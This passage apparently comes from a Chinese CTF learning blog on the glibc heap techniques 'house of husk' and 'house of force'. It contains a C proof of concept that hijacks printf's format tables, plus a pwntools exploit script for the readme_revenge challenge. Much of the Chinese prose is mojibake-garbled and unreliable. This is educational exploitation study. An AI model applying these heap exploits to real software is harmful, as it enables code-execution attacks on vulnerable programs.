class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h3><p><a href="https://github.com/xmzyshypnc/xz_files/tree/master/34c4_readme_revenge">é¢˜ç›®é“¾æ¥</a></p><h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141234308.png" alt="image-20230214123424178"></p><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141235591.png" alt="image-20230214123517550"></p><p>ç¨‹åºå°±æ˜¯å¾€ <code>bss</code> æ®µä¸Šè¾“å…¥æ•°æ®ï¼Œç„¶å <code>printf</code> å°†æ•°æ®æ‰“å°å‡ºæ¥ã€‚</p><p>ç¨‹åºä¸ºé™æ€é“¾æ¥ï¼Œå¹¶ä¸” <code>flag</code> å°±åœ¨ <code>data</code> æ®µä¸­ï¼Œåªè¦å°†å…¶è¯»å‡ºæ¥å³å¯</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141238392.png" alt="image-20230214123826356"></p><p>ç¨‹åºæ²¡æœ‰å¼€ <code>PIE</code> ä¿æŠ¤ï¼Œå› ä¸ºé™æ€é“¾æ¥çš„åŸå› ï¼Œæ‰€ä»¥ <code>libc</code> ä¸­çš„ä»£ç å’Œæ•°æ®åœ°å€éƒ½æ˜¯å·²çŸ¥çš„ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬åŠ«æŒ <code>printf</code> å‡½æ•°ä¸­ <code>__printf_arginfo_table</code> å’Œ <code>__printf_function_table</code> ä¸¤ä¸ªæŒ‡é’ˆçš„æœºä¼š</p><p>æˆ‘ä»¬å…ˆæœä¸€ä¸‹è¿™ä¸¤ä¸ªåœ°å€çœ‹çœ‹åœ¨å“ª</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141243372.png" alt="image-20230214124341330"></p><p>å‘ç°è¾“å…¥æ•°æ®çš„èµ·å§‹åœ°å€ <code>name</code> æ¯”é‚£ä¸¤ä¸ªæŒ‡é’ˆè¦ä½ï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥å¡«å……æ•°æ®ç„¶åç¯¡æ”¹ä¸¤ä¸ªæŒ‡é’ˆï¼Œä»è€Œæ‰§è¡Œ <code>printf</code> å‡½æ•°çš„æ—¶å€™åŠ«æŒæ‰§è¡Œæµ</p><h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><p>æ­£å¸¸å¡«å……åƒåœ¾æ•°æ®ï¼Œå°† <code>__printf_function_table</code> ç¯¡æ”¹ä¸ºä»»æ„å€¼ï¼ˆä¸ä¸º <code>NULL</code>ï¼‰å³å¯ã€‚</p><p>å°† <code>__printf_arginfo_table</code> ç¯¡æ”¹ä¸º <code>åœ°å€A</code> ï¼ˆè¿™ä¸ª <code>åœ°å€A</code> éšæ„ï¼Œåªè¦æ»¡è¶³ <code>*(A+(0x73*8))</code> å¤„çš„å€¼ä¸º <code>__stack_chk_fail()</code> çš„åœ°å€å°±è¡Œï¼ˆ <code>0x73</code> æ˜¯ æ ¼å¼åŒ–å­—ç¬¦<code>s</code> ï¼‰ï¼‰</p><p>ä½†å¦‚æœä»…ä»…åªä¼ªé€ ä¸Šé¢ä¸¤ä¸ªä½ç½®çš„æ•°æ®ï¼Œå…¶ä»–åœ°æ–¹å¡«å……ä¸ºåƒåœ¾æ•°æ®çš„è¯ï¼Œåˆ™ä¼šåœ¨ <code>__parse_one_specmb</code> å‡½æ•°ä¸­ä¸‹é¢çš„ä»£ç éƒ¨åˆ†å‡ºç°é—®é¢˜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_modifier_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || __printf_modifier_table[*format] == <span class="literal">NULL</span></span><br><span class="line">    || HANDLE_REGISTERED_MODIFIER (&amp;format, &amp;spec-&gt;info) != <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æº¢å‡ºä¼ªé€ æ•°æ®æ—¶ï¼Œéœ€è¦æ§åˆ¶ <code>__printf_modifier_table</code> ä¸º <code>NULL</code> ä¸ç„¶ä¼šè§¦å‘ä¸€äº›åˆ«çš„æ¡ä»¶çš„åˆ¤æ–­å¯¼è‡´ç¨‹åºå´©æºƒæˆ–è€…æ‰§è¡Œæµèµ°åï¼Œè¿™ä¸ª <code>__printf_modifier_table</code> ä½äº <code>__printf_function_table</code> åœ°å€åŠ  <code>8</code> çš„ä½ç½®</p><p>æ»¡è¶³ä¸Šé¢çš„éƒ¨åˆ†å°±å¯ä»¥æˆåŠŸåœ¨ <code>*__printf_arginfo_table[spec-&gt;info.spec]</code> è¿™ä¸ªä½ç½®æ¥åŠ«æŒæ‰§è¡Œæµï¼Œæˆ‘ä»¬å°†æ­¤å¤„æ§åˆ¶ä¸º <code>__stack_chk_fail()</code> ï¼Œè¯¥å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šæ‰“å°å‡º <code>__libc_argv[0]</code> æŒ‡å‘çš„å­—ç¬¦ä¸²</p><p>å…ˆç¡®å®š <code>__libc_argv[0]</code> çš„åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141310775.png" alt="image-20230214131007737"></p><p>ç„¶åéœ€è¦å‘è¿™ä¸ªåœ°å€é‡Œå†™å…¥ä¸€ä¸ªæŒ‡å‘ <code>flag</code> åœ°å€çš„æŒ‡é’ˆã€‚</p><p>æˆ‘å¸ƒç½®çš„æƒ…å†µå¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141311225.png" alt="image-20230214131134190"></p><p>ä¸Šè¿°å¸ƒå±€å…¨éƒ¨å®Œæˆï¼Œæ‰§è¡Œ <code>printf((__int64)&quot;Hi, %s. Bye.\n&quot;, name);</code> æ—¶å°±å¯ä»¥å°† <code>flag</code> æ‰“å°å‡ºæ¥</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=load(<span class="string">&#x27;readme_revenge&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x45ad0f</span>)</span><br><span class="line">leak_flag=<span class="number">0x4359B0</span></span><br><span class="line">flag_addr=<span class="number">0x6B4040</span></span><br><span class="line">payload=p64(flag_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x598</span></span><br><span class="line">payload+=p64(<span class="number">0x6B73E0</span>)<span class="comment">#__libc_argv[0]</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x640</span>-<span class="number">0x5a0</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#__printf_function_table</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#__printf_modifier_table</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload+=p64(<span class="number">0x6b7aa8</span>)<span class="comment">#__printf_arginfo_table</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">0x72</span></span><br><span class="line">payload+=p64(leak_flag)<span class="comment">#__stack_chk_fail</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141317933.png" alt="image-20230214131708408"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ²¡æƒ³åˆ°æ—¥å¸¸ä½¿ç”¨çš„ <code>printf</code> å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥åŠ«æŒæ‰§è¡Œæµçš„ã€‚ä½†éœ€è¦æ³¨æ„è¯¥æ‰‹æ³•çš„åˆ©ç”¨æ¡ä»¶å…¶å®æœ‰äº›è‹›åˆ»ï¼Œè€Œä¸”æ²¡æœ‰åŠæ³•æ§åˆ¶å‚æ•°ï¼Œåªèƒ½åŠ«æŒåˆ° <code>one_gadget</code> æˆ–è€…ä¸éœ€è¦å‚æ•°çš„åœ°å€ã€‚æ‰€ä»¥é™¤äº†å°‘éƒ¨åˆ†çš„é¢˜ç›®å¤–ï¼Œè¯¥æ‰‹æ³•å¹¶ä¸æ˜¯ä¸€ä¸ªæœ€ä¼˜çš„é€‰æ‹©ï¼Œä½†é€šè¿‡ <code>house of husk</code> ä¹Ÿè®©æˆ‘äº†è§£åˆ°äº† <code>printf</code> å‡½æ•°ä¸­å¯¹äºè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦çš„å¤„ç†æµç¨‹ä»¥åŠå¯åŠ«æŒæ‰§è¡Œæµçš„ä½ç½®ï¼Œæ­£æ‰€è°“æŠ€å¤šä¸å‹èº«ï¼Œ<code>house of husk</code> ç¡®å®æ˜¯ä¸€ä¸ªæœ‰è¶£çš„æ”»å‡»æ€è·¯</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> house of husk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºhouse of forceçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/73595adc.html"/>
      <url>/posts/73595adc.html</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="ä»‹ç»ï¼š"><a href="#ä»‹ç»ï¼š" class="headerlink" title="ä»‹ç»ï¼š"></a>ä»‹ç»ï¼š</h2><p>house of forceæ˜¯é’ˆå¯¹top chunkçš„ä¸€ç§æ‰‹æ³•ï¼Œé€šè¿‡è¿™ç§æ”»å‡»æ‰‹æ³•ï¼Œå¯ä»¥å°†top chunkæ›´æ–°åˆ°ä»»æ„å†…å­˜ï¼Œå†æ¬¡ç”³è¯·å †å—å¹¶å†™å…¥æ•°æ®ï¼Œè¿™å°±ç›¸å½“äºä»»æ„åœ°å€ä»»æ„å†™äº†ã€‚</p><h2 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h2><p>åœ¨<strong>2.23å’Œ2.27</strong>çš„libcç‰ˆæœ¬ä¸­ï¼Œç”±äº<strong>æ²¡æœ‰å¯¹top chunkçš„sizeåˆæ³•æ€§è¿›è¡Œæ£€æŸ¥</strong>ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿ<strong>æ§åˆ¶top chunkçš„sizeä½</strong>ä»¥åŠ<strong>mallocåœ¨ç”³è¯·å †å—æ—¶çš„å¤§å°ä¸å—é™åˆ¶</strong>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œæˆè¯¥æ”»å‡»ã€‚</p><p>å…ˆä»mallocå‡½æ•°æºç çœ‹èµ·ï¼Œå¦‚æœmallocå‡½æ•°æ‰§è¡Œæ—¶å‘ç°æ²¡æœ‰ä»»ä½•çš„binsä¸­çš„å †å—èƒ½å¤Ÿæ»¡è¶³éœ€æ±‚ï¼Œå°±ä¼šä»top chunkä¸­åˆ‡ä¸‹ä¸€å—å†…å­˜è¿”å›ç»™malloc**(å‰ææ˜¯top chunkèƒ½å¤Ÿæœ‰è¿™ä¹ˆå¤šå†…å­˜ä¾›åˆ‡å‰²)**</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;<span class="comment">//è·å–å½“å‰top chunkçš„åœ°å€</span></span><br><span class="line">size = chunksize (victim);<span class="comment">//è®¡ç®—top chunkçš„å¤§å°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line"><span class="comment">//MINSIZEå°±æ˜¯å †å—çš„æœ€å°sizeï¼Œ32ä½ç¨‹åºä¸º0x10ï¼Œ64ä½ç¨‹åºä¸º0x20</span></span><br><span class="line"><span class="comment">//å¦‚æœtop chunkçš„å¤§å°å¤§äºnb(ç¨‹åºæ‰§è¡Œmallocéœ€è¦åˆ†é…çš„å†…å­˜å¤§å°)</span></span><br><span class="line"><span class="comment">//åŠ ä¸ŠMINSIZEçš„å¤§å°ï¼Œå°±ä»top chunkä¸­æ¥åˆ‡ä¸€å—å†…å­˜</span></span><br><span class="line"><span class="comment">//ä¹‹æ‰€ä»¥è¦åŠ ä¸ŠMINSIZEæ˜¯è¦ä¿è¯åˆ‡å‰²åå‰©ä½™çš„å†…å­˜è¦æ˜¯ä¸€ä¸ªå®Œæ•´çš„å †å—</span></span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//remainder_sizeä¸ºåˆ‡å‰²åçš„å‰©ä½™å¤§å°</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);<span class="comment">//remainderä¸ºåˆ‡å‰²å‰top chunk+nbçš„å€¼ï¼Œä¹Ÿå°±æ˜¯åˆ‡å‰²åtop chunkçš„åœ°å€</span></span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//æ›´æ–°top chunk</span></span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸¤ä¸ªset_headç»™åˆ‡å‰²å‡ºå»çš„å †å—ä»¥åŠåˆ‡å‰²åçš„top chunkè®¾ç½®æ–°çš„size</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);<span class="comment">//è°ƒè¯•ç”¨çš„ï¼Œè¿™é‡Œæ²¡ç”¨</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//è¿”å›ç”¨æˆ·æŒ‡é’ˆ</span></span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´çš„åˆ©ç”¨åœ¨è¿™ä¸€è¡Œä»£ç <code>remainder = chunk_at_offset (victim, nb)</code> å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶nbçš„å€¼ï¼Œå…¶å®å°±å¯ä»¥æ§åˆ¶remainderçš„å€¼äº†(remainderå°±æ˜¯åˆ‡å‰²åçš„top chunkçš„åœ°å€)ï¼Œè¿™ä¸ªæ‰‹æ³•æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯ç²¾å‡†æ§åˆ¶åˆ‡å‰²åtop chunkçš„åœ°å€ã€‚</p><h2 id="æ¢ç©¶ä¸€ä¸‹å¦‚ä½•æ§åˆ¶top-chunkçš„åœ°å€"><a href="#æ¢ç©¶ä¸€ä¸‹å¦‚ä½•æ§åˆ¶top-chunkçš„åœ°å€" class="headerlink" title="æ¢ç©¶ä¸€ä¸‹å¦‚ä½•æ§åˆ¶top_chunkçš„åœ°å€"></a>æ¢ç©¶ä¸€ä¸‹å¦‚ä½•æ§åˆ¶top_chunkçš„åœ°å€</h2><p>ä¸‹é¢æˆ‘ä»¬æ·±å…¥åˆ†æä¸€ä¸‹ä¸Šé¢é‚£ä¸ªå¼å­ï¼Œæ¥æ¢ç©¶ä¸€ä¸‹å¦‚ä½•ç²¾å‡†æ§åˆ¶top chunkçš„åœ°å€ã€‚</p><p>é¦–å…ˆ<code>remainder = chunk_at_offset (victim, nb)</code>ç­‰ä»·äºä¸‹é¢è¿™ä¸ªå¼å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+nb=top_chunk</span><br></pre></td></tr></table></figure><blockquote><p>victimä¸ºåˆ‡å‰²å‰çš„top chunk headeråœ°å€<br>nbä¸ºå®é™…è¦ç”³è¯·çš„å†…å­˜å¤§å°<br>top_chunkä¸ºåˆ‡å‰²åçš„top chunk headerçš„åœ°å€</p></blockquote><p>ç„¶åå°†nbå’Œtop_chunkå†å…·ä½“å±•å¼€ä¸€ä¸‹(è§£é‡Šåœ¨ä»£ç çš„ä¸‹é¢)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nb=request_size+0x10</span><br><span class="line">top_chunk+0x10=target_addr</span><br></pre></td></tr></table></figure><blockquote><p>nb ä¹Ÿç­‰äºæˆ‘ä»¬mallocæ—¶çš„å†…å­˜å¤§å°(requset_size)ï¼Œå†åŠ ä¸Šä¸€ä¸ª0x10çš„chunkå¤´<br>target_addrå…ˆå‡è®¾æ˜¯ç¯¡æ”¹top chunkåçš„åœ°å€<br>house of forceçš„æ ¸å¿ƒå°±æ˜¯ç¯¡æ”¹top chunkçš„åœ°å€ï¼Œè€Œæˆ‘ä»¬çš„æ•°æ®è‡ªç„¶æ˜¯åªèƒ½è¾“å…¥åˆ°ç”¨æˆ·åŒºï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è®©top chunk+0x10åæ‰èƒ½ä¿è¯target_addræ˜¯ä½äºäº†ç¯¡æ”¹åchunkçš„ç”¨æˆ·åŒº</p></blockquote><p>å°†ä¸Šé¢ä¸¤éƒ¨åˆ†æ•´åˆä¸€ä¸‹ï¼Œå³ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+request_size+0x10=target_addr-0x10</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•´ç†ä¸€ä¸‹ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure><p>å™è¿°ä¸€ä¸‹è¿™ä¸ªå¼å­å°±æ˜¯æˆ‘ä»¬ <strong>æ‰€ç”³è¯·çš„å†…å­˜å¤§å°ç­‰äºæƒ³è¦å°†top chunkç¯¡æ”¹åˆ°çš„åœ°å€å‡å»top chunkåŸæœ¬çš„åœ°å€å†å‡å»0x20</strong> <u>ï¼ˆ32ä½ç¨‹åºæ˜¯-0x10ï¼ŒåŸç†ä¸€æ ·ï¼Œåªä¸è¿‡åŸæœ¬0x8çš„å†…å­˜å•å…ƒå˜æˆäº†0x4ï¼Œæ‰€ä»¥æœ€ç»ˆçš„å€¼å‡åŠï¼‰</u></p><h2 id="house-of-forceä¸­å¯¹top-chunkçš„sizeè¿›è¡Œçš„æ£€æŸ¥"><a href="#house-of-forceä¸­å¯¹top-chunkçš„sizeè¿›è¡Œçš„æ£€æŸ¥" class="headerlink" title="house of forceä¸­å¯¹top chunkçš„sizeè¿›è¡Œçš„æ£€æŸ¥"></a>house of forceä¸­å¯¹top chunkçš„sizeè¿›è¡Œçš„æ£€æŸ¥</h2><p>æ­¤æ—¶æˆ‘ä»¬æ‰§è¡Œmalloc(request_size)ï¼Œå°±å¯ä»¥å°†top chunkæ›´æ–°åˆ°æŒ‡å®šçš„åœ°å€äº†ä¹ˆ?</p><blockquote><p>ä¸å¯ä»¥ã€‚åˆ«å¿˜äº†å­˜åœ¨ä¸€ä¸ªæ£€æŸ¥<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>é€šå¸¸æ¥è¯´æˆ‘ä»¬è¿™ä¸ªrequest_sizeæ˜¯ä¸ªè´Ÿæ•°ï¼Œå¼ºè½¬ä¸ºæ— ç¬¦å·æ•´æ•°è¿›è¡Œåˆ¤æ–­æ—¶ï¼Œrequest_sizeè‚¯å®šä¸ºä¸€ä¸ªè¶…å¤§çš„æ•°å€¼ï¼Œå¦‚æœtop chunkæœ¬èº«çš„sizeæ˜¯æ­£å¸¸çš„è¯ï¼Œå¿…ç„¶æ— æ³•æ»¡è¶³è¿™ä¸ªè¦æ±‚ï¼Œå› æ­¤house of forceçš„ä¸€ä¸ªæ¡ä»¶å°±æ˜¯å¯ä»¥æ§åˆ¶top chunkçš„sizeä½(é€šå¸¸éƒ½æ˜¯é€šè¿‡æº¢å‡ºçš„æ–¹å¼)ï¼Œå°†å…¶sizeè®¾ç½®ä¸º-1ï¼Œ-1æ˜¯è½¬æ¢æˆæ— ç¬¦å·æ•´æ•°æ—¶ï¼Œå°†å˜æˆæœ€å¤§çš„æ•°å­—0xffffffffffffffffï¼Œæ— è®ºrequest_sizeä¸ºå¤šå¤§éƒ½å¯ä»¥é€šè¿‡ifæ£€æŸ¥äº†ã€‚</p></blockquote><p>å°†top chunkçš„sizeæ”¹ä¸º0xffffffffffffffffåï¼Œå†æ‰§è¡Œmalloc(request_size)ï¼Œå³å¯å°†top chunkæ›´æ–°åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ï¼Œç„¶åå†æ¬¡mallocæ—¶å³å¯å°†è¯¥å†…å­˜ç”³è¯·å‡ºæ¥ï¼Œå¹¶å†™å…¥æ•°æ®ã€‚ä¸Šè¿°å†…å®¹å°±æ˜¯house of forceçš„æ”»å‡»è¿‡ç¨‹äº†ã€‚</p><h2 id="house-of-forceæ‰‹æ³•æ€»ç»“"><a href="#house-of-forceæ‰‹æ³•æ€»ç»“" class="headerlink" title="house of forceæ‰‹æ³•æ€»ç»“"></a>house of forceæ‰‹æ³•æ€»ç»“</h2><blockquote><p>é€‚ç”¨libcç‰ˆæœ¬:2.23 2.27</p><p>ä½¿ç”¨å‰æ:</p><p>1ã€ç”³è¯·å †å—çš„å¤§å°ä¸å—é™åˆ¶</p><p>2ã€èƒ½å¤Ÿç¯¡æ”¹top chunkçš„sizeä½(ä¸»è¦æ˜¯é€šè¿‡æº¢å‡ºçš„æ‰‹æ®µ)</p><p>3ã€æœ‰top chunkåŸæœ¬çš„åœ°å€(è¿™ä¸€æ¡åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¯ä»¥ä¸å…·å¤‡)</p><p>4ã€æœ‰å°†top chunkæ›´æ–°åçš„ç›®çš„åœ°å€(è¿™ä¸€æ¡åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¯ä»¥ä¸å…·å¤‡)</p><p>PSï¼šç‰¹æ®Šæƒ…å†µä¸ºï¼šæˆ‘ä»¬åªéœ€è¦top chunkçš„åœ°å€æ›´æ–°åˆ°å †åŒºï¼Œè¿™æ ·æˆ‘ä»¬åªéœ€è¦çŸ¥é“top chunkå’Œç›®çš„åœ°å€äºŒè€…çš„åç§»å³å¯ã€‚(å› ä¸ºæœ¬èº«å…¶å®ç®—request_sizeçš„æ—¶å€™è¦çš„å°±æ˜¯äºŒè€…åç§»)(ç›¸å…³é¢˜ç›®å¯ä»¥çœ‹hitcontraining_bamboobox)</p><p>æ”»å‡»æ•ˆæœï¼šå¯ä»¥å°†top chunkæ›´æ–°åˆ°ä»»æ„å·²çŸ¥åœ°å€ï¼Œå†å°†æ–°çš„å †å—ä»top chunkä¸­ç”³è¯·å‡ºæ¥å†™å…¥æ•°æ®ã€‚å°±å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€ä»»æ„å†™çš„ç›®çš„ã€‚</p><p>é˜²å¾¡æªæ–½ï¼šå¯¹top chunkçš„sizeä½è¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­æ˜¯å¦åˆæ³•</p></blockquote><h1 id="é¢˜ç›®ç»ƒä¹ "><a href="#é¢˜ç›®ç»ƒä¹ " class="headerlink" title="é¢˜ç›®ç»ƒä¹ "></a>é¢˜ç›®ç»ƒä¹ </h1><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007212605409.png" alt="image-20221007212605409"></p><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><p><img src="/../img/image-20221007212736745.png" alt="image-20221007212736745"></p><p>ç®€å•åˆ†æä¸€ä¸‹ç¨‹åºå°±ä¼šå‘ç°ï¼Œè¿™é“é¢˜åªæœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯addå‡½æ•°ã€‚</p><h3 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p><img src="/../img/image-20221007212804763.png"></p><p>é¦–å…ˆæ˜¯mallocç”³è¯·çš„å†…å­˜å¤§å°æ— æ£€æŸ¥ã€‚</p><p><img src="/../img/image-20221007212810461.png" alt="image-20221007212810461"></p><p>ç„¶åprintfä¼šæ‰“å°å‡ºæ¥ç”³è¯·çš„å †åœ°å€ï¼Œæœ€åå°±æ˜¯ä¸ç®¡mallocç”³è¯·çš„å†…å­˜å¤šå¤§ï¼Œéƒ½å¯ä»¥è¾“å…¥0x50å­—èŠ‚çš„å†…å®¹ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æº¢å‡º(ä¼ªä»£ç çœ‹çš„è¯è¿™ä¸ª*v0å’Œ*iæ²¡å…³ç³»ï¼Œä½†æ˜¯çœ‹æ±‡ç¼–çš„è¯å°±ä¼šå‘ç°è¿™ä¿©æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¼°è®¡æ˜¯è½¬ä¼ªä»£ç çš„æ—¶å€™å‡ºé—®é¢˜äº†å§)</p><h3 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" 